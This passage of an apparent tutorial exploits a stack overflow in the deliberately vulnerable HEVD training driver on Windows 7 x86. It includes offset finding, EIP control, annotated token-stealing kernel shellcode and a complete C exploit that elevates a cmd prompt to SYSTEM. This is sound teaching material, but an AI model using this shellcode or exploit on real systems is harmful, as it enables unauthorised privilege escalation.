  0x62, 0x6e, 0x68, 0x61, 0x62, 0x6e, 0x69, 0x61, 0x62, 0x6e, 0x6a, 0x61,
  0x62, 0x6e, 0x6b, 0x61, 0x62, 0x6e, 0x6c, 0x61, 0x62, 0x6e, 0x6d, 0x61,
  0x62, 0x6e, 0x6e, 0x61, 0x62, 0x6e, 0x6f, 0x61, 0x62, 0x6e, 0x70, 0x61,
  0x62, 0x6e, 0x71, 0x61, 0x62, 0x6e, 0x72, 0x61, 0x62, 0x6e, 0x73, 0x61,
  0x62, 0x6e, 0x74, 0x61, 0x62, 0x6e, 0x75, 0x61, 0x62, 0x6e, 0x76, 0x61,
  0x62, 0x6e, 0x77, 0x61, 0x62, 0x6e, 0x78, 0x61, 0x62, 0x6e, 0x79, 0x61,
  0x62, 0x6e, 0x7a, 0x61, 0x62, 0x6f, 0x62, 0x61, 0x62, 0x6f, 0x63, 0x61,
  0x62, 0x6f, 0x64, 0x61, 0x62, 0x6f, 0x65, 0x61, 0x62, 0x6f, 0x66, 0x61,
  0x62, 0x6f, 0x67, 0x61, 0x62, 0x6f, 0x68, 0x61, 0x62, 0x6f, 0x69, 0x61,
  0x62, 0x6f, 0x6a, 0x61, 0x62, 0x6f, 0x6b, 0x61, 0x62, 0x6f, 0x6c, 0x61,
  0x62, 0x6f, 0x6d, 0x61, 0x62, 0x6f, 0x6e, 0x61, 0x62, 0x6f, 0x6f, 0x61,
  0x62, 0x6f, 0x70, 0x61, 0x62, 0x6f, 0x71, 0x61, 0x62, 0x6f, 0x72, 0x61,
  0x62, 0x6f, 0x73, 0x61, 0x62, 0x6f, 0x74, 0x61, 0x62, 0x6f, 0x75, 0x61,
  0x62, 0x6f, 0x76, 0x61, 0x62, 0x6f, 0x77, 0x61, 0x62, 0x6f, 0x78, 0x61,
  0x62, 0x6f, 0x79, 0x61, 0x62, 0x6f, 0x7a, 0x61, 0x62, 0x70, 0x62, 0x61,
  0x62, 0x70, 0x63, 0x61, 0x62, 0x70, 0x64, 0x61, 0x62, 0x70, 0x65, 0x61,
  0x62, 0x70, 0x66, 0x61, 0x62, 0x70, 0x67, 0x61, 0x62, 0x70, 0x68, 0x61,
  0x62, 0x70, 0x69, 0x61, 0x62, 0x70, 0x6a, 0x61, 0x62, 0x70, 0x6b, 0x61,
  0x62, 0x70, 0x6c, 0x61, 0x62, 0x70, 0x6d, 0x61, 0x62, 0x70, 0x6e, 0x61,
  0x62, 0x70, 0x6f, 0x61, 0x62, 0x70, 0x70, 0x61, 0x62, 0x70, 0x71, 0x61,
  0x62, 0x70, 0x72, 0x61, 0x62, 0x70, 0x73, 0x61, 0x62, 0x70, 0x74, 0x61,
  0x62, 0x70, 0x75, 0x61, 0x62, 0x70, 0x76, 0x61, 0x62, 0x70, 0x77, 0x61,
  0x62, 0x70, 0x78, 0x61, 0x62, 0x70, 0x79, 0x61, 0x62, 0x70, 0x7a, 0x61
};
unsigned int __Ring0Payload_len = 2100;
```
<br>
We can now copy this buffer into our exploit code, do a `memcpy` of the 
Ring0Payload into the InputBuffer and then call `DeviceIoControl`  
<br>
```c
const char Ring0Payload[] = { 0x7a, 0x61, 0x61, ...};
int main()
{
    ...
    HANDLE hHeap = GetProcessHeap();
    LPVOID InBuffer = HeapAlloc(hHeap, HEAP_NO_SERIALIZE | HEAP_ZERO_MEMORY, 2100);
    memcpy(InBuffer, Ring0Payload, 2100);
    DWORD lpBytesReturned = 0;
    BOOL IOCTLSent = DeviceIoControl(
        hHEVD,
        HEVD_IOCTL_BUFFER_OVERFLOW_STACK,
        InBuffer,
        2100,
        NULL,
        0,
        &lpBytesReturned,
        NULL
    );
}
```
<br>
If we compile and run this our attached kernel debugger should break on a 
_Access Violation_.  
<br>
```
[+] HackSys Extreme Vulnerable Driver Loaded
****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******
[+] UserBuffer: 0x000D8D30
[+] UserBuffer Size: 0x834
[+] KernelBuffer: 0x9A9032B4
[+] KernelBuffer Size: 0x800
[+] Triggering Buffer Overflow in Stack
Access violation - code c0000005 (!!! second chance !!!)
```
<br>
We can see the UserBuffer Size is 0x834 == 2100, and the KernelBuffer size is 
0x800 which is 0x34 bytes less than what we tried to copy in. If we inspect the 
registers we should see part of our pattern in EIP ( yours will be different ).\
<br>
```
kd> r
eax=00000000 ebx=8657cc38 ecx=4b35839a edx=00000000 esi=826c8087 edi=8657cbc8
eip=75616175 esp=9d343ae0 ebp=75616174 iopl=0         nv up ei ng nz ac po nc
```
<br>
If we take the EIP value ( 75616175 ) and ( ensuring we use the same generator 
that we used to create the cyclic pattern ) call generator.find we should be 
able to find how big the buffer must be before we start overwriting the return 
address:\
<br>
```python
# Generator created previously
>>> generator.find(75616175)
>>> 0x820
```
<br>

---

**NOTE**  
Note that pwntools generator.find() returns the offset where the given value 
starts. So for the above the byte 75616175 start at offset 0x820 from the 
buffer, meaning when we do our buffer overflow we need to fill the buffer with 
0x820 bytes of junk and then put our 4 byte return address after that.

---
<br>
We now want to verify that we can precisely control the return address for 
`TriggerBufferOverflowStack` given we have determined the required size the 
buffer needs to be. Lets rerun the exploit but lets change our input buffer to 
be 0x820 A's and 4 B's for our return address to verify we calculated the 
offset correctly.  
<br>
```c
int main()
{
    ...
    HANDLE hHeap = GetProcessHeap();
    LPVOID InBuffer = HeapAlloc(hHeap, HEAP_NO_SERIALIZE | HEAP_ZERO_MEMORY, 0x824);
    memset(InBuffer, 0x41, 0x820);
    /* Arithmetic on a VOID * is illegal in C, wary of pointer scaling, we cast 
    to PCHAR before we do arithmetic */
    memset(((PCHAR)InBuffer)+0x820, 0x42, 0x4);
    DWORD lpBytesReturned = 0;
    BOOL IOCTLSent = DeviceIoControl(
        hHEVD,
        HEVD_IOCTL_BUFFER_OVERFLOW_STACK,
        InBuffer,
        0x824,
        NULL,
        0,
        &lpBytesReturned,
        NULL
    );
}
```
<br>

---

**TIP**  
Remember to update the size of the HeapAlloc and the InputBuffer size parameter 
in DeviceIoControl because they don't need to be 2100 (0x834) as we know the 
real size of the buffer required. 

---

<br>
If you rerun the exploit and check EIP you should see EIP hold the value 
0x42424242. If not I would verify again that you used the same generator from 
pwntools for the creation of the pattern and finding the offset of the value.  
<br>
```
[+] UserBuffer: 0x000D8D30
[+] UserBuffer Size: 0x824
[+] KernelBuffer: 0x9A9032B4
[+] KernelBuffer Size: 0x800
[+] Triggering Buffer Overflow in Stack
Access violation - code c0000005 (!!! second chance !!!)
42424242 ??              ???
2: kd> r
eax=00000000 ebx=863b8f98 ecx=6118cf10 edx=00000000 esi=826d1087 edi=863b8f28
eip=42424242 esp=9a903ae0 ebp=41414141 iopl=0         nv up ei ng nz ac po nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010292
```
<br>
### Creating and Returning to Our Shellcode Buffer
<br>
Great now we have verified we can reliably control the instruction pointer lets 
create some executable user mode memory which will hold our shellcode and is 
where we will make `TriggerBufferOverflowStack` return to. I'm going to pick a 
size of 0x300 for now, we can increase/decrease it later as we need. I also am 
going to fill it with `0xCC` bytes which is the opcode for `INT 3`  or 
interrupt 3 which is a debugger interrupt of sorts and will cause any attached 
debuggers to break when this opcode is executed which will be helpful to verify 
that we have redirected code execution to this buffer:  
<br>
```c
LPVOID Shellcode = VirtualAlloc(
    NULL,
    0x300,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);
memset(Shellcode, 0xCC, 0x300);
```
<br>
We now need to update the input buffer used in the overflow and place the 
address of our shellcode buffer in the position of the input buffer that will 
overwrite the return address of `TriggerBufferOverflowStack` when the 
`RtlCopyMemory` in the kernel is called.  
<br>
```c
memset(InBuffer, 0x41, 0x820);
*(DWORD*)(((PCHAR)InBuffer) + 0x820) = (DWORD)Shellcode;
```
<br>
Now after we recompile and run the exploit we should see that the debugger 
breaks when executing a `Int 3` instruction which is the start of our buffer. 
You could verify this by printing the address of the shellcode buffer in the 
exploit and comparing where the execution broke in the debugger, or a less 
definitive but probably reliable enough way is to just print 0x300 bytes 
starting at wherever EIP is when the debugger broke and verify that there is 
0x300 `0xCC` bytes which is our shellcode buffer.  
<br>
```
0: kd> db @eip L300
00160000  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
00160010  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
00160020  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
... Snipped for brevity ...
```
<br>
### Writing the Token Stealing Shellcode
<br>
Ok now we have redirected execution to a user mode buffer of shellcode we need 
to put some meaningful shellcode in it to turn this vulnerability into a LPE. 
I will briefly outline the steps required to obtain the system security token 
value and then we will walk through implementing that in shellcode.  
<br>
Firstly to clarify, I want to give system privileges to the cmd prompt that I 
am using to run my exploit. I could give system privileges to the exploit 
process itself and then write some code after the IOCTL code that will run as 
system, however an administrator cmd prompt will be cool so we can compare the 
before and after privilege level with the `whoami` command.  
<br>
This method of LPE -- Token Stealing -- involves copying the token from the 
[\_EPROCESS](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/
eprocess#eprocess) structure of the SYSTEM process (PID 4) into the token field 
in the \_EPROCESS structure of the process you want to elevate i.e. the cmd.exe 
process. Obtaining the address of the \_EPROCESS structure for each of the 
respective process is tedious but will be explain in detail below.  
<br>
The \_EPROCESS structure for the current running process can be obtained from 
code running in the kernel on win7 like so:  
<br>
- [fs segment register](https://codemachine.com/articles/x64_deep_dive.html) -- 
Holds a pointer to the [\_KPCR structure](https://codemachine.com/articles/kerne
l_structures.html#KPCR)  
- \_KPCR + 0x20 -- Holds a pointer to the [\_KPRCB structure](https://www.geoffcha
ppell.com/studies/windows/km/ntoskrnl/inc/ntos/kprcb.htm)  
- \_KPRCB + 0x4 -- Holds a pointer to the [\_KTHREAD structure](https://www.geoffcha
ppell.com/studies/windows/km/ntoskrnl/inc/ntos/ke/kthread/310.htm)  
- \_KTHREAD + 0x150 -- Holds a pointer to the \_EPROCESS structure for the current 
running process.  

<br>
Some other things to note that will be required in the shellcode:  
- \_EPROCESS + 0x140 -- Holds the PID of the parent process  
- \_EPROCESS + 0xb4 -- Holds the PID of the current process  
- \_EPROCESS + 0xb8 -- Is a [doubly linked list](https://codemachine.com/article
s/kernel_structures.html#LIST_ENTRY) of all the processes on the 
system and is what you will use to find the \_EPROCESS structure for both the 
SYSTEM process and the cmd.exe parent process.  
- \_EPROCESS + 0xf8 -- Holds a \_EX\_FAST\_REF structure which is what holds the 
security token.  

<br>
Here is the annotated assembly:  

```asm  
pushad                         // Backup registers
mov eax, DWORD PTR fs:[0x20]   // _KPRCB * eax = _KPRC + 0x20
mov eax, DWORD PTR [eax+0x4]   // _KTHREAD * eax = _KPRCB + 0x4
mov eax, DWORD PTR [eax+0x150] // _EPROCESS * eax = _KTHREAD + 0x150
mov ecx, eax                   // Store _PROCESS for current thread in ecx for later use
mov esi, DWORD PTR [eax+0x140] // Store Parent PID in esi
lea eax, DWORD PTR [eax+0xb8]  // Move address of the _LIST_ENTRY field into eax

findSystem:
mov eax, DWORD PTR [eax+0x4]   // Move backward in the active process list using the Blink
mov ebx, DWORD PTR [eax-0x4]   // Get the Unique Process Id (PID) for this new _EPROCESS structure
cmp ebx, 0x4                   // Compare PID against 4 (SYSTEMS PID)
jne findSystem                 // If PID != 4, this _EPROCESS strucutre is not for SYSTEM, iterate
                                  to the next _EPROCESS structure
                               
                               // If the JNE instruction didn't jump it means the PID for the
                                  _EPROCESS structure == 4 which means its the _EPROCESS structure
                                  for SYSTEM
                                  
sub eax, 0xb8                  // Point EAX back to the beginning of the _EPROCESS structure
add eax, 0xf8                  // Point EAX to the _EX_FAST_REF field ( The token field ) 
mov eax, [eax]                 // Move the token value into eax
and al, 0xf8                   // And off the refcount bits
mov edi, eax                   // Store SYSTEM token in edi
mov eax, ecx                   // Set eax back to the current processes _EPROCESS structure
lea eax, DWORD PTR [eax+0xb8]  // Move _LIST_ENTRY into eax 

findParent:
mov eax, DWORD PTR [eax+0x4]   // Move backward in the active process list using the Blink
mov ebx, DWORD PTR [eax-0x4]   // Get the Unique Process Id (PID)
cmp ebx, esi                   // Compre the pid of the _EPROCESS structure against the PID of
                                  the parent process
jne findParent                 // If they arent equal continue looping through the _EPROCESS 
                                  structures
sub eax, 0xb8                  // If they are equal you have found the _EPROCESS structure for
                                  the parent process, point EAX to the start of that _EPROCESS
                                  structure
add eax, 0xf8                  // Point EAX to the _EX_FAST_REF field ( The token field ) 
mov [eax], edi                 // Write the token from the SYTEM _EPROCESS structure that we
                                  stored in edi into the address of the token structure in the
                                  parent processes token field.
popad                          // Restore all the registers to what they were before the shellcode
```

<br>
There is one last thing we need to add. After our shellcode finishes it will 
just start executing whatever is following the last instruction above (`popad`) 
which will probably be junk and cause an access violation. An access violation 
in the kernel will cause an Bugcheck which we don't want. We need to use 
our shellcode to return gracefully from the `BufferOverflowStackIoctlHandler` 
because that's were ordinarily `TriggerBufferOverflowStack` should have returned 
back to, not our shellcode. If we look at the instructions immediately 
following the return from `TriggerBufferOverflowStack` we see the following:  
<br>
```
2: kd> u HEVD!BufferOverflowStackIoctlHandler L20
HEVD!BufferOverflowStackIoctlHandler 
... Snipped for brevity ...
924b6195 e808000000      call    HEVD!TriggerBufferOverflowStack (924b61a2)
924b619a 8bc8            mov     ecx,eax
924b619c 8bc1            mov     eax,ecx
924b619e 5d              pop     ebp
924b619f c20800          ret     8
```
<br>
We see that it moves eax (the return value of `TriggerBufferOverflowStack` into 
ecx and then does the redundant action of moving ecx back into eax which doesn't 
change anything, then a pop into ebp followed by a ret 8. This what the stack 
of the program, and the compiler intended to happen after 
`TriggerBufferOverflowStack` returned so we should add it to the end of our 
shellcode to clean up after our exploit.\
<br>

---

**NOTE**  
If you try leaving these instruction out you will notice after you run your 
exploit your box will freeze

---

<br>
```asm
... token stealing shellcode from above...
popad
mov ecx, eax                   
mov eax, ecx
pop ebp
ret 8
```
<br>
Now we need to assemble that shellcode and place the opcode bytes into a buffer 
and put it into our exploit so we can copy it into our executable buffer. A way 
to do this is to create another Visual Studio console application, place your 
shellcode into the body of a function using the c [\_\_asm](https://learn.micros
oft.com/en-us/cpp/assembler/inline/asm?view=msvc-170) keyword, build the 
program and then use Windbg or DUMPBIN to extract the opcodes. E.g. you visual 
studio program should look like the following:\
<br>
```c
void build_shellcode() {
  __asm
  {     
    pushad                         // Backup registers
    mov eax, DWORD PTR fs:[0x20]   // _KPRCB * eax = _KPRC + 0x20
    mov eax, DWORD PTR [eax+0x4]   // _KTHREAD * eax = _KPRCB + 0x4
    mov eax, DWORD PTR [eax+0x150] // _EPROCESS * eax = _KTHREAD + 0x150
    mov ecx, eax                   // Store _PROCESS for current thread in ecx for later use
    mov esi, DWORD PTR [eax+0x140] // Store Parent PID in esi
    lea eax, DWORD PTR [eax+0xb8]  // Move address of the _LIST_ENTRY field into eax
    
    findSystem:
    mov eax, DWORD PTR [eax+0x4]   // Move backward in the active process list using the Blink
    mov ebx, DWORD PTR [eax-0x4]   // Get the Unique Process Id (PID) for this new _EPROCESS structure
    cmp ebx, 0x4                   // Compare PID against 4 (SYSTEMS PID)
    jne findSystem                 // If PID != 4, this _EPROCESS strucutre is not for SYSTEM, iterate
                                   //  to the next _EPROCESS structure
                                   
                                   // If the JNE instruction didn't jump it means the PID for the
                                   //_EPROCESS structure == 4 which means its the _EPROCESS structure
                                   // for SYSTEM
                                      
    sub eax, 0xb8                  // Point EAX back to the beginning of the _EPROCESS structure
    add eax, 0xf8                  // Point EAX to the _EX_FAST_REF field ( The token field ) 
    mov eax, [eax]                 // Move the token value into eax
    and al, 0xf8                   // And off the refcount bits
    mov edi, eax                   // Store SYSTEM token in edi
    mov eax, ecx                   // Set eax back to the current processes _EPROCESS structure
    lea eax, DWORD PTR [eax+0xb8]  // Move _LIST_ENTRY into eax 
    
    findParent:
    mov eax, DWORD PTR [eax+0x4]   // Move backward in the active process list using the Blink
    mov ebx, DWORD PTR [eax-0x4]   // Get the Unique Process Id (PID)
    cmp ebx, esi                   // Compre the pid of the _EPROCESS structure against the PID of
                                   // the parent process
    jne findParent                 // If they arent equal continue looping through the _EPROCESS 
                                   // structures
    sub eax, 0xb8                  // If they are equal you have found the _EPROCESS structure for
                                   // the parent process, point EAX to the start of that _EPROCESS
                                   //  structure
    add eax, 0xf8                  // Point EAX to the _EX_FAST_REF field ( The token field ) 
    mov [eax], edi                 // Write the token from the SYTEM _EPROCESS structure that we
                                   // stored in edi into the address of the token structure in the
                                   // parent processes token field.
    popad                          // Restore all the registers to what they were before the shellcode

    mov ecx, eax                   // Existing epilogue cleanup
    mov eax, ecx                   // Existing epilogue cleanup
    pop ebp                        // Existing epilogue cleanup
    ret 8                          // Existing epilogue cleanup
  }
}

int main()
{
    build_shellcode();
}
```
<br>
Then once you build your executable load it up into windbg as a dump file you 
can disassembly the build\_shellcode function and find the address when your 
shellcode starts:  
<br>
```
u build_shellcode L40
Compiling_x86_asm!build_shellcode 
00411e70 55              push    ebp
00411e71 8bec            mov     ebp,esp
00411e73 81ecc0000000    sub     esp,0C0h
00411e79 53              push    ebx
00411e7a 56              push    esi
00411e7b 57              push    edi
00411e7c 8bfd            mov     edi,ebp
00411e7e 33c9            xor     ecx,ecx
00411e80 b8cccccccc      mov     eax,0CCCCCCCCh
00411e85 f3ab            rep stos dword ptr es:[edi]
00411e87 60              pushad
00411e88 64a120000000    mov     eax,dword ptr fs:[00000020h]
00411e8e 8b4004          mov     eax,dword ptr [eax+4]
00411e91 8b8050010000    mov     eax,dword ptr [eax+150h]
```
<br>
`0x411e87` is where our shellcode starts and it ends at `0x411ee4`, if we 
subtract the start from the end address we gets its size: `0x411ee7 - 0x411e87 
= 60` and so if we just display 60 bytes starting at the start address of the 
shellcode we cut out all the noise from the compiler:\
<br>
```
0:000> db 411e87 L60
00411e87  60 64 a1 20 00 00 00 8b-40 04 8b 80 50 01 00 00  `d. ....@...P...
00411e97  8b c8 8b b0 40 01 00 00-8d 80 b8 00 00 00 8b 40  ....@..........@
00411ea7  04 8b 58 fc 83 fb 04 75-f5 2d b8 00 00 00 05 f8  ..X....u.-......
00411eb7  00 00 00 8b 00 24 f8 8b-f8 8b c1 8d 80 b8 00 00  .....$..........
00411ec7  00 8b 40 04 8b 58 fc 3b-de 75 f6 2d b8 00 00 00  ..@..X.;.u.-....
00411ed7  05 f8 00 00 00 89 38 61-8b c8 8b c1 5d c2 08 00  ......8a....]...
```
<br>
This needs to be cleaned up and put into a c style buffer, do that how you 
like.\
<br>
```c
const unsigned char StealTokenShellcode[] = {
    0x60, 0x64, 0xa1, 0x20, 0x00, 0x00, 0x00, 0x8b, 0x40, 0x04, 0x8b,
    0x80, 0x50, 0x01, 0x00, 0x00, 0x8b, 0xc8, 0x8b, 0xb0, 0x40, 0x01, 
    0x00, 0x00, 0x8d, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x8b, 0x40, 0x04, 
    0x8b, 0x58, 0xfc, 0x83, 0xfb, 0x04, 0x75, 0xf5, 0x2d, 0xb8, 0x00, 
    0x00, 0x00, 0x05, 0xf8, 0x00, 0x00, 0x00, 0x8b, 0x00, 0x24, 0xf8, 
    0x8b, 0xf8, 0x8b, 0xc1, 0x8d, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x8b, 
    0x40, 0x04, 0x8b, 0x58, 0xfc, 0x3b, 0xde, 0x75, 0xf6, 0x2d, 0xb8, 
    0x00, 0x00, 0x00, 0x05, 0xf8, 0x00, 0x00, 0x00, 0x89, 0x38, 0x61, 
    0x8b, 0xc8, 0x8b, 0xc1, 0x5d, 0xc2, 0x08, 0x00
};
```
<br>
Now we can update the size of the shellcode buffer and copy in the shellcode to 
be run.\
<br>
```c
LPVOID Shellcode = VirtualAlloc(
    NULL,
    sizeof(StealTokenShellcode),
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);
memcpy(Shellcode, StealTokenShellcode, sizeof(StealTokenShellcode));
```
<br>
The final exploit code should look something like the following ( I have 
removed error checking in the previous code snippets in this document to keep 
them as minimal as possible and cut out all the noise. However the following 
exploit code has all my error checking code and debug prints ):  
<br>
```c
#include <Windows.h>
#include <stdio.h>

/* IOCTL Definitions */
#define CTL_CODE( DeviceType, Function, Method, Access ) \
    ( ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) )
#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK IOCTL(0x800)

const char* lpFileName = "\\\\.\\HackSysExtremeVulnerableDriver";

const unsigned char StealTokenShellcode[] = {
    0x60, 0x64, 0xa1, 0x20, 0x00, 0x00, 0x00, 0x8b, 0x40, 0x04, 0x8b,
    0x80, 0x50, 0x01, 0x00, 0x00, 0x8b, 0xc8, 0x8b, 0xb0, 0x40, 0x01, 
    0x00, 0x00, 0x8d, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x8b, 0x40, 0x04, 
    0x8b, 0x58, 0xfc, 0x83, 0xfb, 0x04, 0x75, 0xf5, 0x2d, 0xb8, 0x00, 
    0x00, 0x00, 0x05, 0xf8, 0x00, 0x00, 0x00, 0x8b, 0x00, 0x24, 0xf8, 
    0x8b, 0xf8, 0x8b, 0xc1, 0x8d, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x8b, 
    0x40, 0x04, 0x8b, 0x58, 0xfc, 0x3b, 0xde, 0x75, 0xf6, 0x2d, 0xb8, 
    0x00, 0x00, 0x00, 0x05, 0xf8, 0x00, 0x00, 0x00, 0x89, 0x38, 0x61, 
    0x8b, 0xc8, 0x8b, 0xc1, 0x5d, 0xc2, 0x08, 0x00
};

int main()
{
    HANDLE hHEVD = CreateFileA(lpFileName,
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL);

    if (INVALID_HANDLE_VALUE == hHEVD) {
        printf("[!] Failed to get handle to HEVD device\n");
        return 1;
    }
    printf("[+] Obtained handle to device %s: %p\n", lpFileName, hHEVD);

    HANDLE hHeap = GetProcessHeap();
    if (NULL == hHeap)
    {
        printf("[!] Failed to get handle to process heap\n");
        return 2;

    }
    printf("[+] Obtained handle to process heap: %p\n", hHeap);

    LPVOID Shellcode = VirtualAlloc(
        NULL,
        sizeof(StealTokenShellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (NULL == Shellcode)
    {
        printf("[!] Failed to allocate RWX memory for shellcode\n");
        return 4;
    }
    printf("[+] Allocated RWX memory for shellcode at: %p\n", Shellcode);
    memcpy(Shellcode, StealTokenShellcode, sizeof(StealTokenShellcode));

    LPVOID InBuffer = HeapAlloc(hHeap, HEAP_NO_SERIALIZE | HEAP_ZERO_MEMORY, 0x824);
    if (NULL == InBuffer)
    {
        printf("[!] Failed allocate space for input buffer\n");
        return 3;

    }
    printf("[+] Allocated space for input buffer %p\n", InBuffer);
    memset(InBuffer, 0x41, 0x820);
    *(DWORD*)(((PCHAR)InBuffer) + 0x820) = (DWORD)Shellcode;

    printf("[+] Sending HEVD_IOCTL_BUFFER_OVERFLOW_STACK IOCTL to %s\n", lpFileName);
    DWORD lpBytesReturned = 0;  
    BOOL IOCTLSent = DeviceIoControl(
        hHEVD,
        HEVD_IOCTL_BUFFER_OVERFLOW_STACK,
        InBuffer,
        0x824,
        NULL,
        0,
        &lpBytesReturned,
        NULL
    );

    printf("[+] SUCCESS\n");
    return 0;
}
```

<br>
If we compile and run it you should see the following.  
<br>
![Exploit Output](/assets/images/HEVD-Win7-x86-StackBufferOverflow-Success.png)  

